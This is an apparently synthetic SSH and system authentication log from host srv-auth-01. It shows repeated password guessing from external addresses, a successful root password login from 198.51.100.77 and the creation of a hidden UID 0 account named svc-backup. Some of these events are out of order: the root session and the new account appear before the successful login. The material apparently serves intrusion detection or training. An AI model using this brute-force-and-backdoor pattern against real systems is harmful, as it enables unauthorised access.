+2026-11-05 01:08:11 srv-auth-01 CRON[5564]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:08:12 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:08:13 srv-auth-01 sshd[1430]: Failed password for invalid user oracle from 203.0.113.9 port 35911 ssh2
+2026-11-05 01:08:14 srv-auth-01 systemd[1]: Started Session 729 of user deploy.
+2026-11-05 01:08:15 srv-auth-01 systemd[1]: Started Session 953 of user deploy.
+2026-11-05 01:08:16 srv-auth-01 systemd[1]: Started Session 369 of user deploy.
+2026-11-05 01:08:17 srv-auth-01 sshd[7012]: Failed password for root from 198.51.100.77 port 41012 ssh2
+2026-11-05 01:08:18 srv-auth-01 CRON[3972]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:08:19 srv-auth-01 sshd[7566]: Accepted publickey for deploy from 10.0.1.38 port 54280 ssh2
+2026-11-05 01:08:20 srv-auth-01 CRON[2503]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:08:21 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:08:22 srv-auth-01 sshd[7878]: Failed password for invalid user pi from 203.0.113.89 port 35157 ssh2
+2026-11-05 01:08:23 srv-auth-01 systemd[1]: Started Session 329 of user deploy.
+2026-11-05 01:08:24 srv-auth-01 systemd[1]: Started Session 805 of user deploy.
+2026-11-05 01:08:25 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:08:26 srv-auth-01 CRON[1861]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:08:27 srv-auth-01 sshd[3579]: Accepted publickey for deploy from 10.0.9.14 port 52084 ssh2
+2026-11-05 01:08:28 srv-auth-01 CRON[5458]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:08:29 srv-auth-01 sshd[7947]: Failed password for invalid user pi from 203.0.113.157 port 44484 ssh2
+2026-11-05 01:08:30 srv-auth-01 sshd[5475]: Failed password for invalid user test from 203.0.113.195 port 46788 ssh2
+2026-11-05 01:08:31 srv-auth-01 CRON[6655]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:08:32 srv-auth-01 sshd[2816]: Failed password for invalid user oracle from 203.0.113.175 port 52232 ssh2
+2026-11-05 01:08:33 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:08:34 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:08:35 srv-auth-01 systemd[1]: Started Session 56 of user deploy.
+2026-11-05 01:08:36 srv-auth-01 sshd[7475]: Accepted publickey for deploy from 10.0.9.16 port 30251 ssh2
+2026-11-05 01:08:37 srv-auth-01 sshd[5938]: Accepted publickey for deploy from 10.0.3.198 port 34496 ssh2
+2026-11-05 01:08:38 srv-auth-01 sshd[7014]: Failed password for root from 198.51.100.77 port 41014 ssh2
+2026-11-05 01:08:39 srv-auth-01 systemd[1]: Started Session 306 of user deploy.
+2026-11-05 01:08:40 srv-auth-01 systemd[1]: Started Session 132 of user deploy.
+2026-11-05 01:08:41 srv-auth-01 CRON[9149]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:08:42 srv-auth-01 sshd[3878]: Failed password for invalid user test from 203.0.113.99 port 47451 ssh2
+2026-11-05 01:08:43 srv-auth-01 sshd[9196]: Accepted publickey for deploy from 10.0.8.215 port 51890 ssh2
+2026-11-05 01:08:44 srv-auth-01 sshd[7018]: Failed password for root from 198.51.100.77 port 41018 ssh2
+2026-11-05 01:08:45 srv-auth-01 systemd[1]: Started Session 83 of user deploy.
+2026-11-05 01:08:46 srv-auth-01 sshd[7028]: Failed password for root from 198.51.100.77 port 41028 ssh2
+2026-11-05 01:08:47 srv-auth-01 sshd[1693]: Failed password for invalid user pi from 203.0.113.6 port 45065 ssh2
+2026-11-05 01:08:48 srv-auth-01 CRON[6129]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:08:49 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:08:50 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:08:51 srv-auth-01 sshd[5743]: Failed password for invalid user admin from 203.0.113.105 port 30683 ssh2
+2026-11-05 01:08:52 srv-auth-01 systemd[1]: Started Session 185 of user deploy.
+2026-11-05 01:08:53 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:08:54 srv-auth-01 systemd[1]: Started Session 100 of user deploy.
+2026-11-05 01:08:55 srv-auth-01 sshd[2734]: Failed password for invalid user test from 203.0.113.113 port 49296 ssh2
+2026-11-05 01:08:56 srv-auth-01 sshd[9584]: Failed password for invalid user admin from 203.0.113.103 port 58525 ssh2
+2026-11-05 01:08:57 srv-auth-01 systemd[1]: Started Session 773 of user deploy.
+2026-11-05 01:08:58 srv-auth-01 systemd[1]: Started Session 236 of user deploy.
+2026-11-05 01:08:59 srv-auth-01 systemd[1]: Started Session 807 of user deploy.
+2026-11-05 01:09:00 srv-auth-01 sshd[2251]: Accepted publickey for deploy from 10.0.8.164 port 33736 ssh2
+2026-11-05 01:09:01 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:02 srv-auth-01 sshd[6724]: Accepted publickey for deploy from 10.0.5.188 port 56835 ssh2
+2026-11-05 01:09:03 srv-auth-01 sshd[4871]: Accepted publickey for deploy from 10.0.1.39 port 38387 ssh2
+2026-11-05 01:09:04 srv-auth-01 sshd[3842]: Accepted publickey for deploy from 10.0.9.41 port 54910 ssh2
+2026-11-05 01:09:05 srv-auth-01 CRON[3902]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:09:06 srv-auth-01 sshd[8601]: Failed password for invalid user pi from 203.0.113.176 port 58902 ssh2
+2026-11-05 01:09:07 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:08 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:09 srv-auth-01 systemd[1]: Started Session 164 of user deploy.
+2026-11-05 01:09:10 srv-auth-01 sshd[2118]: Failed password for invalid user pi from 203.0.113.115 port 50689 ssh2
+2026-11-05 01:09:11 srv-auth-01 sshd[7021]: Failed password for root from 198.51.100.77 port 41021 ssh2
+2026-11-05 01:09:12 srv-auth-01 sshd[7017]: Failed password for root from 198.51.100.77 port 41017 ssh2
+2026-11-05 01:09:13 srv-auth-01 systemd[1]: Started Session 825 of user deploy.
+2026-11-05 01:09:14 srv-auth-01 sshd[7019]: Failed password for root from 198.51.100.77 port 41019 ssh2
+2026-11-05 01:09:15 srv-auth-01 systemd[1]: Started Session 615 of user deploy.
+2026-11-05 01:09:16 srv-auth-01 CRON[6766]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:09:17 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:18 srv-auth-01 systemd[1]: Started Session 482 of user deploy.
+2026-11-05 01:09:19 srv-auth-01 sshd[1616]: Failed password for invalid user admin from 203.0.113.96 port 57253 ssh2
+2026-11-05 01:09:20 srv-auth-01 systemd[1]: Started Session 88 of user deploy.
+2026-11-05 01:09:21 srv-auth-01 CRON[9307]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:09:22 srv-auth-01 sshd[8581]: Failed password for invalid user admin from 203.0.113.117 port 59787 ssh2
+2026-11-05 01:09:23 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:24 srv-auth-01 sshd[6267]: Accepted publickey for deploy from 10.0.9.123 port 46428 ssh2
+2026-11-05 01:09:25 srv-auth-01 sshd[2013]: Accepted publickey for deploy from 10.0.7.28 port 56573 ssh2
+2026-11-05 01:09:26 srv-auth-01 systemd[1]: Started Session 741 of user deploy.
+2026-11-05 01:09:27 srv-auth-01 CRON[9266]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:09:28 srv-auth-01 sshd[1641]: Accepted publickey for deploy from 10.0.3.183 port 44344 ssh2
+2026-11-05 01:09:29 srv-auth-01 sshd[9586]: Failed password for invalid user test from 203.0.113.95 port 42217 ssh2
+2026-11-05 01:09:30 srv-auth-01 systemd[1]: Started Session 406 of user deploy.
+2026-11-05 01:09:31 srv-auth-01 sshd[6543]: Failed password for invalid user admin from 203.0.113.204 port 50672 ssh2
+2026-11-05 01:09:32 srv-auth-01 systemd[1]: Started Session 77 of user deploy.
+2026-11-05 01:09:33 srv-auth-01 systemd[1]: Started Session 106 of user deploy.
+2026-11-05 01:09:34 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:35 srv-auth-01 sshd[5655]: Failed password for invalid user oracle from 203.0.113.187 port 57904 ssh2
+2026-11-05 01:09:36 srv-auth-01 sshd[7024]: Failed password for root from 198.51.100.77 port 41024 ssh2
+2026-11-05 01:09:37 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:38 srv-auth-01 systemd[1]: Started Session 93 of user deploy.
+2026-11-05 01:09:39 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:40 srv-auth-01 sshd[6731]: Accepted publickey for deploy from 10.0.4.249 port 51497 ssh2
+2026-11-05 01:09:41 srv-auth-01 sshd[3112]: Failed password for invalid user admin from 203.0.113.81 port 48314 ssh2
+2026-11-05 01:09:42 srv-auth-01 sshd[6381]: Failed password for invalid user test from 203.0.113.173 port 53030 ssh2
+2026-11-05 01:09:43 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:44 srv-auth-01 sshd[9331]: Failed password for invalid user oracle from 203.0.113.6 port 41881 ssh2
+2026-11-05 01:09:45 srv-auth-01 sshd[7025]: Failed password for root from 198.51.100.77 port 41025 ssh2
+2026-11-05 01:09:46 srv-auth-01 systemd[1]: Started Session 194 of user deploy.
+2026-11-05 01:09:47 srv-auth-01 sshd[6598]: Accepted publickey for deploy from 10.0.7.51 port 37423 ssh2
+2026-11-05 01:09:48 srv-auth-01 sshd[3538]: Accepted publickey for deploy from 10.0.1.77 port 57670 ssh2
+2026-11-05 01:09:49 srv-auth-01 CRON[9317]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:09:50 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:51 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:52 srv-auth-01 systemd[1]: Started Session 907 of user deploy.
+2026-11-05 01:09:53 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:54 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:55 srv-auth-01 sshd[3658]: Accepted publickey for deploy from 10.0.2.214 port 52703 ssh2
+2026-11-05 01:09:56 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:09:57 srv-auth-01 sshd[1715]: Failed password for invalid user pi from 203.0.113.95 port 52163 ssh2
+2026-11-05 01:09:58 srv-auth-01 sshd[8277]: Accepted publickey for deploy from 10.0.9.74 port 54654 ssh2
+2026-11-05 01:09:59 srv-auth-01 sshd[4833]: Failed password for invalid user test from 203.0.113.81 port 56496 ssh2
+2026-11-05 01:10:00 srv-auth-01 sshd[4178]: Failed password for invalid user oracle from 203.0.113.175 port 48691 ssh2
+2026-11-05 01:10:01 srv-auth-01 sshd[8564]: Failed password for invalid user oracle from 203.0.113.201 port 42513 ssh2
+2026-11-05 01:10:02 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:10:03 srv-auth-01 sshd[3655]: Failed password for invalid user test from 203.0.113.207 port 49813 ssh2
+2026-11-05 01:10:04 srv-auth-01 sshd[5096]: Accepted publickey for deploy from 10.0.0.166 port 45747 ssh2
+2026-11-05 01:10:05 srv-auth-01 systemd[1]: Started Session 577 of user deploy.
+2026-11-05 01:10:06 srv-auth-01 CRON[9452]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:07 srv-auth-01 CRON[5670]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:08 srv-auth-01 CRON[3626]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:09 srv-auth-01 systemd[1]: Started Session 470 of user deploy.
+2026-11-05 01:10:10 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:10:11 srv-auth-01 sshd[2502]: Failed password for invalid user test from 203.0.113.211 port 44782 ssh2
+2026-11-05 01:10:12 srv-auth-01 systemd[1]: Started Session 962 of user deploy.
+2026-11-05 01:10:13 srv-auth-01 CRON[7797]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:14 srv-auth-01 CRON[7495]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:15 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:10:16 srv-auth-01 sshd[7326]: Accepted publickey for deploy from 10.0.1.97 port 37357 ssh2
+2026-11-05 01:10:17 srv-auth-01 CRON[6221]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:18 srv-auth-01 CRON[6493]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:19 srv-auth-01 sshd[3254]: Accepted publickey for deploy from 10.0.0.75 port 57189 ssh2
+2026-11-05 01:10:20 srv-auth-01 sshd[3273]: Failed password for invalid user pi from 203.0.113.116 port 50163 ssh2
+2026-11-05 01:10:21 srv-auth-01 CRON[2298]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:22 srv-auth-01 CRON[5193]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:23 srv-auth-01 sshd[3449]: Accepted publickey for deploy from 10.0.8.242 port 53830 ssh2
+2026-11-05 01:10:24 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:10:25 srv-auth-01 sshd[2821]: Failed password for invalid user oracle from 203.0.113.62 port 39868 ssh2
+2026-11-05 01:10:26 srv-auth-01 CRON[1782]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:27 srv-auth-01 sshd[7878]: Accepted publickey for deploy from 10.0.9.119 port 32058 ssh2
+2026-11-05 01:10:28 srv-auth-01 CRON[9189]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:29 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:10:30 srv-auth-01 CRON[9443]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:31 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:10:32 srv-auth-01 sshd[5772]: Accepted publickey for deploy from 10.0.6.2 port 50146 ssh2
+2026-11-05 01:10:33 srv-auth-01 systemd[1]: Started Session 256 of user deploy.
+2026-11-05 01:10:34 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:10:35 srv-auth-01 sshd[2402]: Accepted publickey for deploy from 10.0.8.94 port 32217 ssh2
+2026-11-05 01:10:36 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:10:37 srv-auth-01 systemd[1]: Started Session 4242 of user root.
+2026-11-05 01:10:38 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:10:39 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:10:40 srv-auth-01 sshd[8702]: Failed password for invalid user admin from 203.0.113.164 port 42677 ssh2
+2026-11-05 01:10:41 srv-auth-01 systemd[1]: Started Session 269 of user deploy.
+2026-11-05 01:10:42 srv-auth-01 CRON[6850]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:43 srv-auth-01 CRON[6649]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:44 srv-auth-01 sshd[2698]: Accepted publickey for deploy from 10.0.9.190 port 54794 ssh2
+2026-11-05 01:10:45 srv-auth-01 systemd[1]: Started Session 146 of user deploy.
+2026-11-05 01:10:46 srv-auth-01 useradd[7120]: new user: name=svc-backup, UID=0, GID=0, home=/root, shell=/bin/bash
+2026-11-05 01:10:47 srv-auth-01 CRON[6772]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:48 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:10:49 srv-auth-01 sshd[8612]: Accepted publickey for deploy from 10.0.7.163 port 35972 ssh2
+2026-11-05 01:10:50 srv-auth-01 sshd[7029]: Failed password for root from 198.51.100.77 port 41029 ssh2
+2026-11-05 01:10:51 srv-auth-01 sshd[2033]: Accepted publickey for deploy from 10.0.7.11 port 39615 ssh2
+2026-11-05 01:10:52 srv-auth-01 sshd[1717]: Accepted publickey for deploy from 10.0.3.228 port 31373 ssh2
+2026-11-05 01:10:53 srv-auth-01 systemd[1]: Started Session 965 of user deploy.
+2026-11-05 01:10:54 srv-auth-01 systemd[1]: Started Session 537 of user deploy.
+2026-11-05 01:10:55 srv-auth-01 sshd[9897]: Failed password for invalid user pi from 203.0.113.66 port 31199 ssh2
+2026-11-05 01:10:56 srv-auth-01 sshd[5687]: Accepted publickey for deploy from 10.0.5.222 port 55586 ssh2
+2026-11-05 01:10:57 srv-auth-01 CRON[6438]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:10:58 srv-auth-01 systemd[1]: Started Session 137 of user deploy.
+2026-11-05 01:10:59 srv-auth-01 systemd[1]: Started Session 457 of user deploy.
+2026-11-05 01:11:00 srv-auth-01 sshd[8204]: Failed password for invalid user pi from 203.0.113.88 port 36121 ssh2
+2026-11-05 01:11:01 srv-auth-01 sshd[9151]: Failed password for invalid user oracle from 203.0.113.238 port 56125 ssh2
+2026-11-05 01:11:02 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:11:03 srv-auth-01 CRON[7955]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:04 srv-auth-01 CRON[8055]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:05 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:11:06 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:11:07 srv-auth-01 systemd[1]: Started Session 115 of user deploy.
+2026-11-05 01:11:08 srv-auth-01 CRON[6372]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:09 srv-auth-01 systemd[1]: Started Session 323 of user deploy.
+2026-11-05 01:11:10 srv-auth-01 sshd[7981]: Failed password for invalid user test from 203.0.113.178 port 44545 ssh2
+2026-11-05 01:11:11 srv-auth-01 systemd[1]: Started Session 467 of user deploy.
+2026-11-05 01:11:12 srv-auth-01 CRON[6776]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:13 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:11:14 srv-auth-01 systemd[1]: Started Session 664 of user deploy.
+2026-11-05 01:11:15 srv-auth-01 CRON[2229]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:16 srv-auth-01 sshd[6952]: Failed password for invalid user test from 203.0.113.245 port 31020 ssh2
+2026-11-05 01:11:17 srv-auth-01 sshd[8179]: Accepted publickey for deploy from 10.0.0.34 port 32203 ssh2
+2026-11-05 01:11:18 srv-auth-01 sshd[7001]: Accepted publickey for deploy from 10.0.5.100 port 48587 ssh2
+2026-11-05 01:11:19 srv-auth-01 CRON[3513]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:20 srv-auth-01 sshd[7077]: Failed password for invalid user oracle from 203.0.113.115 port 55004 ssh2
+2026-11-05 01:11:21 srv-auth-01 CRON[3255]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:22 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:11:23 srv-auth-01 sshd[6150]: Failed password for invalid user oracle from 203.0.113.65 port 33717 ssh2
+2026-11-05 01:11:24 srv-auth-01 CRON[4048]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:25 srv-auth-01 sshd[9482]: Failed password for invalid user pi from 203.0.113.235 port 48404 ssh2
+2026-11-05 01:11:26 srv-auth-01 sshd[7027]: Failed password for root from 198.51.100.77 port 41027 ssh2
+2026-11-05 01:11:27 srv-auth-01 CRON[5288]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:28 srv-auth-01 systemd[1]: Started Session 730 of user deploy.
+2026-11-05 01:11:29 srv-auth-01 sshd[4515]: Failed password for invalid user oracle from 203.0.113.179 port 46095 ssh2
+2026-11-05 01:11:30 srv-auth-01 sshd[3009]: Accepted publickey for deploy from 10.0.2.220 port 32426 ssh2
+2026-11-05 01:11:31 srv-auth-01 sshd[3828]: Failed password for invalid user pi from 203.0.113.24 port 56558 ssh2
+2026-11-05 01:11:32 srv-auth-01 systemd[1]: Started Session 693 of user deploy.
+2026-11-05 01:11:33 srv-auth-01 systemd[1]: Started Session 736 of user deploy.
+2026-11-05 01:11:34 srv-auth-01 CRON[9882]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:35 srv-auth-01 systemd[1]: Started Session 922 of user deploy.
+2026-11-05 01:11:36 srv-auth-01 systemd[1]: Started Session 881 of user deploy.
+2026-11-05 01:11:37 srv-auth-01 sshd[3852]: Accepted publickey for deploy from 10.0.5.132 port 37347 ssh2
+2026-11-05 01:11:38 srv-auth-01 CRON[4292]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:39 srv-auth-01 sshd[4878]: Accepted publickey for deploy from 10.0.7.8 port 41825 ssh2
+2026-11-05 01:11:40 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:11:41 srv-auth-01 systemd[1]: Started Session 488 of user deploy.
+2026-11-05 01:11:42 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:11:43 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:11:44 srv-auth-01 CRON[6067]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:45 srv-auth-01 sshd[8842]: Failed password for invalid user pi from 203.0.113.198 port 43416 ssh2
+2026-11-05 01:11:46 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:11:47 srv-auth-01 sshd[6194]: Accepted publickey for deploy from 10.0.1.117 port 45264 ssh2
+2026-11-05 01:11:48 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:11:49 srv-auth-01 sshd[3981]: Accepted publickey for deploy from 10.0.2.112 port 46477 ssh2
+2026-11-05 01:11:50 srv-auth-01 CRON[3034]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:51 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:11:52 srv-auth-01 systemd[1]: Started Session 178 of user deploy.
+2026-11-05 01:11:53 srv-auth-01 sshd[6286]: Accepted publickey for deploy from 10.0.3.90 port 47003 ssh2
+2026-11-05 01:11:54 srv-auth-01 systemd[1]: Started Session 876 of user deploy.
+2026-11-05 01:11:55 srv-auth-01 CRON[5105]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:56 srv-auth-01 sshd[5496]: Accepted publickey for deploy from 10.0.2.162 port 39922 ssh2
+2026-11-05 01:11:57 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:11:58 srv-auth-01 CRON[9234]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:11:59 srv-auth-01 sshd[3526]: Accepted publickey for deploy from 10.0.2.170 port 50462 ssh2
+2026-11-05 01:12:00 srv-auth-01 sshd[7100]: Accepted password for root from 198.51.100.77 port 41031 ssh2
+2026-11-05 01:12:01 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:12:02 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:12:03 srv-auth-01 CRON[2330]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:12:04 srv-auth-01 CRON[5336]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:12:05 srv-auth-01 sshd[7825]: Accepted publickey for deploy from 10.0.9.165 port 30992 ssh2
+2026-11-05 01:12:06 srv-auth-01 sshd[9938]: Failed password for invalid user oracle from 203.0.113.166 port 39899 ssh2
+2026-11-05 01:12:07 srv-auth-01 sshd[5012]: Failed password for invalid user pi from 203.0.113.78 port 44861 ssh2
+2026-11-05 01:12:08 srv-auth-01 CRON[1981]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:12:09 srv-auth-01 sshd[8202]: Accepted publickey for deploy from 10.0.6.125 port 45218 ssh2
+2026-11-05 01:12:10 srv-auth-01 sshd[6573]: Accepted publickey for deploy from 10.0.9.38 port 40242 ssh2
+2026-11-05 01:12:11 srv-auth-01 systemd[1]: Started Session 761 of user deploy.
+2026-11-05 01:12:12 srv-auth-01 systemd[1]: Started Session 418 of user deploy.
+2026-11-05 01:12:13 srv-auth-01 sshd[7070]: Accepted publickey for deploy from 10.0.8.145 port 33479 ssh2
+2026-11-05 01:12:14 srv-auth-01 systemd[1]: Started Session 257 of user deploy.
+2026-11-05 01:12:15 srv-auth-01 sshd[3007]: Failed password for invalid user oracle from 203.0.113.117 port 38123 ssh2
+2026-11-05 01:12:16 srv-auth-01 sshd[2586]: Accepted publickey for deploy from 10.0.0.76 port 42587 ssh2
+2026-11-05 01:12:17 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:12:18 srv-auth-01 sshd[3616]: Accepted publickey for deploy from 10.0.5.241 port 48929 ssh2
+2026-11-05 01:12:19 srv-auth-01 systemd[1]: Started Session 204 of user deploy.
+2026-11-05 01:12:20 srv-auth-01 sshd[9163]: Accepted publickey for deploy from 10.0.8.121 port 46343 ssh2
